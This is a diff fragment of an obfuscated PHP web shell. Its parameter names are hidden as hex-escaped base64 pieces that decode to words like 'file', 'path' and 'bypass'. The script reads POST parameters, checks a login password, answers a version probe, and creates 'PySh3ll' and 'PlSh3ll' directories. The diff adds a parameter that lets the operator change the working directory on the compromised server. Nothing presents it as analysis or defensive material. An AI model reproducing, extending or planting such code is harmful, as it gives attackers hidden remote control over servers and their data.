@@ -31,6 +31,8 @@ $XS_1 = "\x63\x77\x3d\x3d";$XS_2 = "\x61\x41\x3d\x3d";$XS_3 = "\x5a\x51\x3d\x3d"
 $XS_1 = base64_decode("$XS_1").base64_decode("$XS_2").base64_decode("$XS_3").base64_decode("$XS_4").base64_decode("$XS_5").base64_decode("$XS_6").base64_decode("$XS_7").base64_decode("$XS_8").base64_decode("$XS_9").base64_decode("$XS_10");
 $FL_1 = "\x5a\x67\x3d\x3d";$FL_2 = "\x61\x51\x3d\x3d";$FL_3 = "\x62\x41\x3d\x3d";$FL_4 = "\x5a\x51\x3d\x3d";
 $FL_1 = base64_decode("$FL_1").base64_decode("$FL_2").base64_decode("$FL_3").base64_decode("$FL_4");
+$PTH_1 = "\x63\x41\x3d\x3d";$PTH_2 = "\x59\x51\x3d\x3d";$PTH_3 = "\x64\x41\x3d\x3d";$PTH_4 = "\x61\x41\x3d\x3d";
+$PTH_1 = base64_decode("$PTH_1").base64_decode("$PTH_2").base64_decode("$PTH_3").base64_decode("$PTH_4");
 $BY_BAS1 = "\x59\x67\x3d\x3d";$BY_BAS2 = "\x57\x51\x3d\x3d";$BY_BAS3 = "\x59\x67\x3d\x3d";$BY_BAS4 = "\x59\x51\x3d\x3d";$BY_BAS5 = "\x63\x77\x3d\x3d";$BY_BAS6 = "\x63\x77\x3d\x3d";
 $BY_BAS1 = base64_decode("$BY_BAS1").base64_decode("$BY_BAS2").base64_decode("$BY_BAS3").base64_decode("$BY_BAS4").base64_decode("$BY_BAS5").base64_decode("$BY_BAS6");
 $GET_VER1 = "\x64\x67\x3d\x3d";$GET_VER2 = "\x5a\x51\x3d\x3d";$GET_VER3 = "\x63\x67\x3d\x3d";$GET_VER4 = "\x63\x77\x3d\x3d";
@@ -42,11 +44,15 @@ $PST_2 = @$_POST["$FL_1"];
 $PST_3 = @$_POST["$GET_VER1"];
 $PST_4 = @$_POST["$PASS_1"];
 $PST_5 = @$_POST["$BY_BAS1"];
+$PST_6 = @$_POST["$PTH_1"];
 if(isset($PST_3)){
 echo "JB";	
 }
 if(isset($PST_4)){
 if($PST_4 == $PASS_LGN){
+if(isset($PST_6)){
+@chdir($PST_6);	
+}
 if(isset($PST_5)){
 @mkdir('PySh3ll', 0755);
 @mkdir('PlSh3ll', 0755);
